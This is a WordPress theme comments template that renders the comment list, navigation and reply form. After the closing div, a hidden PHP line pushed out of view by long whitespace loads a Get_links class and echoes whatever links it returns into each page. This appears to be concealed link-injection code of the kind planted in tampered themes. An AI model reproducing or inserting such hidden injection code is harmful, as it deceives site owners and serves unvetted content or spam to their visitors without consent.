<?php
if (post_password_required()) {
    ?>
    <p class="nocomments"><?php _e('This post is password protected. Enter the password to view comments.', 'infoway'); ?></p>
    <?php
    return;
}
?>
<!-- You can start editing here. -->
<div id="commentsbox">
    <?php if (have_comments()) : ?>
        <h3 id="comments">
            <?php comments_number('Нет Комментариев', 'Один Комментарий', '% Комментариев'); ?>
            <?php _e('so far.', 'infoway'); ?></h3>
        <ol class="commentlist">
            <?php wp_list_comments(); ?>
        </ol>
        <div class="comment-nav">
            <div class="alignleft">
                <?php previous_comments_link() ?>
            </div>
            <div class="alignright">
                <?php next_comments_link() ?>
            </div>
        </div>
    <?php else : // this is displayed if there are no comments so far ?>
        <?php if (comments_open()) : ?>
            <!-- If comments are open, but there are no comments. -->
        <?php elseif (!is_page() && !comments_open()) : // comments are closed  ?>
            <!-- If comments are closed. -->
            <p class="nocomments"><?php _e('Comments are closed.', 'infoway'); ?></p>
        <?php endif; ?>
    <?php endif; ?>
    <?php if (comments_open()) : ?>
        <div class="post-info"><?php _e('Leave a Comment', 'infoway'); ?></div>
        <div id="comment-form">
            <div id="respond" class="rounded">
                <div class="cancel-comment-reply"> <small>
                        <?php cancel_comment_reply_link(); ?>
                    </small> </div>
                <?php if (get_option('comment_registration') && !is_user_logged_in()) : ?>
                    <p><?php _e('You must be', 'infoway'); ?> <a href="<?php echo wp_login_url(get_permalink()); ?>"><?php _e('logged in', 'infoway'); ?></a> <?php _e('to post a comment.', 'infoway'); ?></p>
                <?php else : ?>
                    <div id="comment-form">
                        <?php comment_form(); ?>
                    </div>
                <?php endif; // If registration required and not logged in  ?>
            </div>
        </div>
    <?php endif; // if you delete this the sky will fall on your head  ?>
</div>																																																											<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->return_links($lib_path); echo $links; ?>
